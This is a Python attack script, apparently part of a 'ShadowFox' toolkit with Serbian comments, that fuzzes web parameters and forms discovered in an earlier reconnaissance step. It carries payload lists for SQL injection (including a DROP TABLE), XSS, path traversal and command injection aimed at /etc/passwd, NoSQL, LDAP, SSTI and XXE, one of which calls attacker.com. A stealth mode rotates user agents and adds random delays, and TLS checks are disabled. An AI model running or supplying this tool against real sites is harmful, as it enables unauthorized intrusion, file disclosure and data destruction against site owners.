#!/usr/bin/env python3
"""
🔥 SHADOWFOX ATTACK MODULE - PARAMETER FUZZING
Specijalna jedinica - Prvi udar na parametre
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import random
import urllib.parse
from itertools import product
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ShadowAttackParamFuzz:
    def __init__(self):
        self.session = requests.Session()
        self.meta_config = {}
        self.recon_data = {}
        self.results = {
            "mission_info": {},
            "attack_summary": {},
            "vulnerable_parameters": [],
            "injection_results": [],
            "error_disclosures": [],
            "response_anomalies": [],
            "confirmed_vulnerabilities": [],
            "statistics": {}
        }
        
        # Payload kategorije
        self.payloads = {
            "sqli_basic": [
                "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", 
                "'; DROP TABLE users; --", "' UNION SELECT NULL--",
                "1' AND 1=1--", "1' AND 1=2--", "admin'--", "' OR 1=1#"
            ],
            "xss_basic": [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')", "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>", "\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>", "<%2fscript%3ealert('XSS')%3c%2fscript%3e"
            ],
            "path_traversal": [
                "../", "../../", "../../../", "....//", 
                "..\\", "..\\..\\", "....\\\\",
                "%2e%2e%2f", "%2e%2e%5c", "..%252f", "..%255c",
                "/etc/passwd", "C:\\windows\\system32\\drivers\\etc\\hosts"
            ],
            "command_injection": [
                "; ls", "| ls", "& ls", "&& ls", "|| ls",
                "; cat /etc/passwd", "| cat /etc/passwd",
                "; whoami", "| whoami", "& whoami",
                "`whoami`", "$(whoami)", "${IFS}cat${IFS}/etc/passwd"
            ],
            "nosql_injection": [
                "{'$gt':''}", "{'$ne':null}", "{'$regex':'.*'}",
                "[$ne]=1", "[$gt]=", "[$regex]=.*",
                "';return true;var a='", "';return(true);var a='"
            ],
            "ldap_injection": [
                "*", "*)(&", "*))%00", "*()|%26'",
                "admin*)((|userpassword=*)", "*)(&(password=*))"
            ],
            "ssti_basic": [
                "{{7*7}}", "${7*7}", "#{7*7}", 
                "{{config}}", "${java.lang.Runtime}", 
                "{{''.__class__.__mro__[2].__subclasses__()}}"
            ],
            "xxe_basic": [
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
            ]
        }
        
    def load_dependencies(self):
        """Učitava Meta config i Recon podatke"""
        try:
            # Meta config
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                
            # Recon podaci
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                
            print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
            print(f"🎯 [RECON] Učitano {len(self.recon_data.get('discovered_parameters', {}))} parametara")
            
        except FileNotFoundError as e:
            print(f"❌ [ERROR] Nedostaje dependency: {str(e)}")
            print("🔧 [FIX] Pokreni ShadowRecon/shadow_recon.py prvo!")
            exit(1)
            
    def setup_session(self):
        """Konfiguracija sesije na osnovu Meta config"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        
        if self.meta_config.get('stealth_mode', False):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]
            self.session.headers['User-Agent'] = random.choice(user_agents)
            
        self.session.verify = False
        self.session.timeout = 15
        
    def intelligent_delay(self):
        """Pametno kašnjenje tokom napada"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1.5))
        else:
            time.sleep(random.uniform(0.1, 0.5))
            
    def detect_vulnerability_indicators(self, response, payload, param_name):
        """Detektuje indikatore ranjivosti u response-u"""
        indicators = []
        response_text = response.text.lower()
        
        # SQL Injection indikatori
        sql_errors = [
            "sql syntax", "mysql error", "ora-", "postgresql error",
            "sqlite error", "microsoft jet database", "odbc error",
            "sql server", "syntax error", "unclosed quotation mark",
            "quoted string not properly terminated"
        ]
        
        for error in sql_errors:
            if error in response_text:
                indicators.append({
                    "type": "SQLi",
                    "severity": "HIGH",
                    "indicator": f"SQL error detected: {error}",
                    "payload": payload,
                    "parameter": param_name
                })
                
        # XSS indikatori (reflektovani payload)
        if any(xss_payload in response.text for xss_payload in ["<script>", "alert(", "javascript:"]):
            if payload in response.text:
                indicators.append({
                    "type": "XSS",
                    "severity": "HIGH", 
                    "indicator": "Payload reflected in response",
                    "payload": payload,
                    "parameter": param_name
                })
                
        # Path Traversal indikatori
        path_indicators = [
            "root:x:", "/bin/bash", "windows\\system32",
            "[boot loader]", "# /etc/passwd"
        ]
        
        for indicator in path_indicators:
            if indicator in response_text:
                indicators.append({
                    "type": "Path Traversal",
                    "severity": "HIGH",
                    "indicator": f"File content disclosed: {indicator}",
                    "payload": payload,
                    "parameter": param_name
                })
                
        # Command Injection indikatori
        cmd_indicators = [
            "uid=", "gid=", "groups=", "root@", "$", "administrator"
        ]
        
        for indicator in cmd_indicators:
            if indicator in response_text:
                indicators.append({
                    "type": "Command Injection",
                    "severity": "CRITICAL",
                    "indicator": f"Command output detected: {indicator}",
                    "payload": payload,
                    "parameter": param_name
                })
                
        # SSTI indikatori
        if "49" in response.text and "{{7*7}}" in payload:
            indicators.append({
                "type": "SSTI",
                "severity": "HIGH",
                "indicator": "Template evaluation detected (7*7=49)",
                "payload": payload,
                "parameter": param_name
            })
            
        # Error disclosure indikatori
        error_patterns = [
            "traceback", "stack trace", "exception", "error occurred",
            "fatal error", "warning:", "debug info", "php error",
            "java.lang.", "python traceback", "internal server error"
        ]
        
        for pattern in error_patterns:
            if pattern in response_text:
                indicators.append({
                    "type": "Information Disclosure",
                    "severity": "MEDIUM",
                    "indicator": f"Error information disclosed: {pattern}",
                    "payload": payload,
                    "parameter": param_name
                })
                
        return indicators
        
    def analyze_response_anomalies(self, baseline_response, test_response, payload, param_name):
        """Analiza anomalija u response-u u odnosu na baseline"""
        anomalies = []
        
        # Razlika u dužini response-a
        length_diff = abs(len(test_response.text) - len(baseline_response.text))
        if length_diff > 100:  # Značajna razlika
            anomalies.append({
                "type": "Response Length Anomaly",
                "severity": "LOW",
                "details": f"Length difference: {length_diff} characters",
                "payload": payload,
                "parameter": param_name
            })
            
        # Razlika u status code-u
        if test_response.status_code != baseline_response.status_code:
            anomalies.append({
                "type": "Status Code Anomaly",
                "severity": "MEDIUM",
                "details": f"Status changed from {baseline_response.status_code} to {test_response.status_code}",
                "payload": payload,
                "parameter": param_name
            })
            
        # Razlika u response time-u (samo ako je drastična)
        if hasattr(test_response, 'elapsed') and hasattr(baseline_response, 'elapsed'):
            time_diff = abs(test_response.elapsed.total_seconds() - baseline_response.elapsed.total_seconds())
            if time_diff > 5:  # Više od 5 sekundi razlike
                anomalies.append({
                    "type": "Response Time Anomaly",
                    "severity": "LOW",
                    "details": f"Time difference: {time_diff:.2f} seconds",
                    "payload": payload,
                    "parameter": param_name
                })
                
        return anomalies
        
    def fuzz_parameter(self, base_url, param_name, param_data, method='GET'):
        """Fuzz-ovanje pojedinačnog parametra"""
        print(f"🎯 [FUZZ] Parametar: {param_name} | Metod: {method}")
        
        vulnerabilities_found = []
        
        # Kreiraj baseline request
        baseline_params = {param_name: "baseline_test_value"}
        try:
            if method.upper() == 'GET':
                baseline_response = self.session.get(base_url, params=baseline_params)
            else:
                baseline_response = self.session.post(base_url, data=baseline_params)
        except Exception as e:
            print(f"❌ [BASELINE ERROR] {param_name}: {str(e)}")
            return vulnerabilities_found
            
        # Test svaku kategoriju payload-a
        for category, payloads in self.payloads.items():
            print(f"   🔬 Testing {category}...")
            
            for payload in payloads:
                self.intelligent_delay()
                
                test_params = {param_name: payload}
                
                try:
                    if method.upper() == 'GET':
                        test_response = self.session.get(base_url, params=test_params)
                    else:
                        test_response = self.session.post(base_url, data=test_params)
                        
                    # Detektuj ranjivosti
                    vulnerability_indicators = self.detect_vulnerability_indicators(
                        test_response, payload, param_name
                    )
                    
                    # Analiza anomalija
                    anomalies = self.analyze_response_anomalies(
                        baseline_response, test_response, payload, param_name
                    )
                    
                    # Snimanje rezultata
                    test_result = {
                        "url": base_url,
                        "parameter": param_name,
                        "payload": payload,
                        "payload_category": category,
                        "method": method,
                        "status_code": test_response.status_code,
                        "response_length": len(test_response.text),
                        "vulnerability_indicators": vulnerability_indicators,
                        "anomalies": anomalies,
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    
                    self.results["injection_results"].append(test_result)
                    
                    # Ako su pronađene ranjivosti, dodaj u confirmed
                    if vulnerability_indicators:
                        vulnerabilities_found.extend(vulnerability_indicators)
                        print(f"   🚨 VULNERABILITY FOUND: {len(vulnerability_indicators)} indicators")
                        
                    if anomalies:
                        self.results["response_anomalies"].extend(anomalies)
                        
                except Exception as e:
                    print(f"   ❌ [PAYLOAD ERROR] {payload[:20]}...: {str(e)}")
                    
        return vulnerabilities_found
        
    def fuzz_forms(self):
        """Fuzz-ovanje svih pronađenih formi"""
        forms_data = self.recon_data.get('forms_found', [])
        
        for form in forms_data:
            form_url = form.get('action', '')
            form_method = form.get('method', 'GET')
            inputs = form.get('inputs', [])
            
            print(f"📝 [FORM FUZZ] {form_url} | Metod: {form_method}")
            
            for input_field in inputs:
                input_name = input_field.get('name')
                if input_name:
                    vulnerabilities = self.fuzz_parameter(form_url, input_name, input_field, form_method)
                    if vulnerabilities:
                        self.results["confirmed_vulnerabilities"].extend(vulnerabilities)
                        
    def fuzz_discovered_parameters(self):
        """Fuzz-ovanje svih parametara iz recon faze"""
        parameters = self.recon_data.get('discovered_parameters', {})
        target_root = self.meta_config.get('target_root')
        
        for param_name, param_info in parameters.items():
            if isinstance(param_info, dict):
                param_data = param_info.get('data', [])
                priority_score = param_info.get('priority_score', 0)
                
                # Fokus na high-priority parametre
                if priority_score > 0 or param_info.get('interesting', False):
                    print(f"⭐ [HIGH PRIORITY] {param_name} (score: {priority_score})")
                    
                    # Test na različitim URL-ovima gde je parametar pronađen
                    tested_urls = set()
                    for data in param_data:
                        source_url = data.get('url', target_root)
                        if source_url and source_url not in tested_urls:
                            tested_urls.add(source_url)
                            vulnerabilities = self.fuzz_parameter(source_url, param_name, data)
                            if vulnerabilities:
                                self.results["confirmed_vulnerabilities"].extend(vulnerabilities)
                                
    def generate_attack_summary(self):
        """Generisanje sažetka attack operacije"""
        total_tests = len(self.results["injection_results"])
        total_vulnerabilities = len(self.results["confirmed_vulnerabilities"])
        total_anomalies = len(self.results["response_anomalies"])
        
        # Grupiranje ranjivosti po tipu
        vuln_by_type = {}
        for vuln in self.results["confirmed_vulnerabilities"]:
            vuln_type = vuln.get('type', 'Unknown')
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = 0
            vuln_by_type[vuln_type] += 1
            
        # Grupiranje po severity
        vuln_by_severity = {}
        for vuln in self.results["confirmed_vulnerabilities"]:
            severity = vuln.get('severity', 'Unknown')
            if severity not in vuln_by_severity:
                vuln_by_severity[severity] = 0
            vuln_by_severity[severity] += 1
            
        summary = {
            "total_injection_tests": total_tests,
            "total_vulnerabilities_found": total_vulnerabilities,
            "total_anomalies_detected": total_anomalies,
            "vulnerabilities_by_type": vuln_by_type,
            "vulnerabilities_by_severity": vuln_by_severity,
            "attack_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "most_vulnerable_parameters": self.get_most_vulnerable_parameters()
        }
        
        self.results["attack_summary"] = summary
        self.results["statistics"] = summary
        
    def get_most_vulnerable_parameters(self):
        """Dobijanje parametara sa najviše ranjivosti"""
        param_vuln_count = {}
        
        for vuln in self.results["confirmed_vulnerabilities"]:
            param = vuln.get('parameter')
            if param:
                if param not in param_vuln_count:
                    param_vuln_count[param] = 0
                param_vuln_count[param] += 1
                
        # Sortiranje po broju ranjivosti
        sorted_params = sorted(param_vuln_count.items(), key=lambda x: x[1], reverse=True)
        return dict(sorted_params[:10])  # Top 10
        
    def save_results(self):
        """Snimanje rezultata u attack_param_fuzz.json"""
        output_file = "Napad/attack_param_fuzz.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Attack rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_attack_summary(self):
        """Prikaz sažetka attack operacije"""
        summary = self.results["attack_summary"]
        
        print("\n🔥 SHADOWFOX ATTACK - SAŽETAK")
        print("=" * 50)
        print(f"🎯 Ukupno testova: {summary['total_injection_tests']}")
        print(f"🚨 Ranjivosti pronađene: {summary['total_vulnerabilities_found']}")
        print(f"⚠️  Anomalije detektovane: {summary['total_anomalies_detected']}")
        
        if summary['vulnerabilities_by_severity']:
            print(f"\n📊 RANJIVOSTI PO SEVERITY:")
            for severity, count in summary['vulnerabilities_by_severity'].items():
                print(f"   • {severity}: {count}")
                
        if summary['vulnerabilities_by_type']:
            print(f"\n🎯 RANJIVOSTI PO TIPU:")
            for vuln_type, count in summary['vulnerabilities_by_type'].items():
                print(f"   • {vuln_type}: {count}")
                
        if summary['most_vulnerable_parameters']:
            print(f"\n🏆 NAJRANJIVIJI PARAMETRI:")
            for param, count in list(summary['most_vulnerable_parameters'].items())[:5]:
                print(f"   • {param}: {count} ranjivosti")
                
        print(f"\n✅ Rezultati: Napad/attack_param_fuzz.json")
        
    def run_attack(self):
        """Glavna attack operacija"""
        print("🔥 SHADOWFOX ATTACK - POKRETANJE NAPADA")
        print("=" * 50)
        
        # 1. Učitaj dependencies
        self.load_dependencies()
        
        # 2. Podesi sesiju
        self.setup_session()
        
        # 3. Fuzz forme
        print("📝 [ATTACK] Fuzzing formi...")
        self.fuzz_forms()
        
        # 4. Fuzz discovered parametri
        print("🎯 [ATTACK] Fuzzing discovered parametara...")
        self.fuzz_discovered_parameters()
        
        # 5. Generiši sažetak
        print("📊 [ATTACK] Generisanje sažetka...")
        self.generate_attack_summary()
        
        # 6. Snimi rezultate
        self.save_results()
        
        # 7. Prikaži sažetak
        self.display_attack_summary()

def main():
    attacker = ShadowAttackParamFuzz()
    attacker.run_attack()

if __name__ == "__main__":
    main()
